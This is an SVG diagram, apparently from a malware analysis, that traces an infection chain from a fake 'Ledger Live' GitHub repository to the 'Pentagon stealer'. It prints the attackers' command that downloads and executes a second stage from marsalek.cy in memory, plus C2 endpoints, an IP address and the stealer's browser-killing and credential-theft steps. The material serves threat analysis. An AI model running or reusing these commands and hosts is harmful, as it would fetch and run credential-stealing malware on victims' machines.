<svg width="100%" viewBox="0 0 760 856" role="img" xmlns="http://www.w3.org/2000/svg" font-family="-apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif">
<title>Fake Ledger Live to Pentagon stealer infection chain</title><desc>Ledger Live.exe from GitHub installs a hidden Python, bootstraps pip through r.vbs, executes a second stage from marsalek.cy in memory, runs python_setup.py and then the Pentagon stealer svc.py, which kills browsers, steals credentials and reports to the C2.</desc>
<defs><marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></marker></defs>
<rect x="0" y="0" width="760" height="856" rx="16" fill="#FBFAF7"/>
<line x1="380" y1="115" x2="380" y2="135" stroke="#73726c" stroke-width="1.5" marker-end="url(#arrow)"/>
<line x1="380" y1="216" x2="380" y2="236" stroke="#73726c" stroke-width="1.5" marker-end="url(#arrow)"/>
<line x1="380" y1="349" x2="380" y2="369" stroke="#73726c" stroke-width="1.5" marker-end="url(#arrow)"/>
<line x1="380" y1="450" x2="380" y2="470" stroke="#73726c" stroke-width="1.5" marker-end="url(#arrow)"/>
<line x1="380" y1="532" x2="380" y2="552" stroke="#73726c" stroke-width="1.5" marker-end="url(#arrow)"/>
<line x1="380" y1="665" x2="380" y2="685" stroke="#73726c" stroke-width="1.5" marker-end="url(#arrow)"/>
<rect x="50" y="20" width="660" height="93" rx="10" fill="#E6F1FB" stroke="#185FA5" stroke-width="0.75"/>
<text x="72" y="42" dominant-baseline="central" font-size="14" font-weight="500" fill="#0C447C">Fake “Ledger Live” repo on GitHub</text>
<text x="72" y="60" dominant-baseline="central" font-size="12" fill="#185FA5">github.com/immemtary/ledger-larp-wallet</text>
<text x="76" y="79" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#0C447C"><tspan fill="#185FA5">├─ </tspan>user downloads Ledger Live.exe (≈2 MB, packed, unsigned)</text>
<text x="76" y="95" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#0C447C"><tspan fill="#185FA5">├─ </tspan>Windows warns “Unknown Publisher”; victim clicks Run</text>
<rect x="50" y="137" width="660" height="77" rx="10" fill="#FAECE7" stroke="#993C1D" stroke-width="0.75"/>
<text x="72" y="159" dominant-baseline="central" font-size="14" font-weight="500" fill="#712B13">Ledger Live.exe</text>
<text x="72" y="177" dominant-baseline="central" font-size="12" fill="#993C1D">drops a private Python install</text>
<text x="76" y="196" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#712B13"><tspan fill="#993C1D">├─ </tspan>%APPDATA%\Google\python\  (python.exe, get-pip.py)</text>
<rect x="50" y="238" width="660" height="109" rx="10" fill="#FAECE7" stroke="#993C1D" stroke-width="0.75"/>
<text x="72" y="260" dominant-baseline="central" font-size="14" font-weight="500" fill="#712B13">wscript.exe %APPDATA%\Google\python\r.vbs</text>
<text x="72" y="278" dominant-baseline="central" font-size="12" fill="#993C1D">runs several times to bootstrap pip</text>
<text x="76" y="297" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#712B13"><tspan fill="#993C1D">├─ </tspan>python get-pip.py</text>
<text x="76" y="313" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#712B13"><tspan fill="#993C1D">├─ </tspan>python -m pip install setuptools</text>
<text x="76" y="329" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#712B13"><tspan fill="#993C1D">├─ </tspan>python -m pip install cryptography fernet requests</text>
<rect x="50" y="371" width="660" height="77" rx="10" fill="#FAECE7" stroke="#993C1D" stroke-width="0.75"/>
<text x="72" y="393" dominant-baseline="central" font-size="14" font-weight="500" fill="#712B13">Second stage downloaded and executed in memory</text>
<text x="72" y="411" dominant-baseline="central" font-size="12" fill="#993C1D">~128 KB script, HTML &lt;pre&gt; tags stripped, passed to exec()</text>
<text x="76" y="430" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#712B13"><tspan fill="#993C1D">├─ </tspan>python -c "exec(requests.get('https://marsalek.cy/paste?userid=5&amp;is_exe=1').text ...)"</text>
<rect x="50" y="472" width="660" height="58" rx="10" fill="#FAECE7" stroke="#993C1D" stroke-width="0.75"/>
<text x="72" y="494" dominant-baseline="central" font-size="14" font-weight="500" fill="#712B13">cmd /c python %APPDATA%\python_setup.py</text>
<text x="72" y="512" dominant-baseline="central" font-size="12" fill="#993C1D">sets up the final stage</text>
<rect x="50" y="554" width="660" height="109" rx="10" fill="#FCEBEB" stroke="#A32D2D" stroke-width="0.75"/>
<text x="72" y="576" dominant-baseline="central" font-size="14" font-weight="500" fill="#791F1F">Pentagon stealer</text>
<text x="72" y="594" dominant-baseline="central" font-size="12" fill="#A32D2D">wscript.exe %TEMP%\r.vbs  →  python %TEMP%\svc.py</text>
<text x="76" y="613" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#791F1F"><tspan fill="#A32D2D">├─ </tspan>pip install pycryptodome pypiwin32 pywin32 requests psutil</text>
<text x="76" y="629" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#791F1F"><tspan fill="#A32D2D">├─ </tspan>taskkill /F /IM &lt;browser&gt;.exe  (~20 browsers)</text>
<text x="76" y="645" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#791F1F"><tspan fill="#A32D2D">├─ </tspan>reads saved passwords, cookies and sessions; watches the clipboard</text>
<rect x="50" y="687" width="660" height="109" rx="10" fill="#FCEBEB" stroke="#A32D2D" stroke-width="0.75"/>
<text x="72" y="709" dominant-baseline="central" font-size="14" font-weight="500" fill="#791F1F">C2 reporting</text>
<text x="72" y="727" dominant-baseline="central" font-size="12" fill="#A32D2D">marsalek.cy — 185.178.208.168 (DDoS-Guard)</text>
<text x="76" y="746" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#791F1F"><tspan fill="#A32D2D">├─ </tspan>POST https://marsalek.cy/create_log</text>
<text x="76" y="762" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#791F1F"><tspan fill="#A32D2D">├─ </tspan>POST https://marsalek.cy/log_data</text>
<text x="76" y="778" dominant-baseline="central" font-size="11" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" fill="#791F1F"><tspan fill="#A32D2D">├─ </tspan>POST https://marsalek.cy/logging/errors</text>
<circle cx="55" cy="830" r="5" fill="#185FA5"/>
<text x="65" y="830" dominant-baseline="central" font-size="12" fill="#444441">Lure</text>
<circle cx="123" cy="830" r="5" fill="#993C1D"/>
